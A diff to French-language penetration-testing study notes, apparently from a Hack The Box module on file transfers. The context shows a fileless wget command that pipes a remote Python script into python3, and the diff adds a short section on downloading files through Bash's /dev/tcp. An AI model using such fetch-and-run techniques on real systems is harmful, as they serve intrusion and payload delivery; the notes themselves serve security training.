@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-20T16:13:55.447Z
+date: 2025-04-20T16:17:54.428Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -394,3 +394,9 @@ Exemple d'opération sans fichier avec Wget:
 wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
 ```
 
+### Download with Bash (/dev/tcp)
+
+Il peut arriver qu'aucun outil de transfert de fichiers classique ne soit disponible.
+Si Bash version 2.04 ou supérieure (avec l'option --enable-net-redirections) est installé, il est possible d'utiliser le fichier /dev/TCP pour télécharger des fichiers simplement.
+
+[Guide pour effectuer des requètes HTTP avec /dev/tcp](https://rednafi.com/misc/http_requests_via_dev_tcp/)
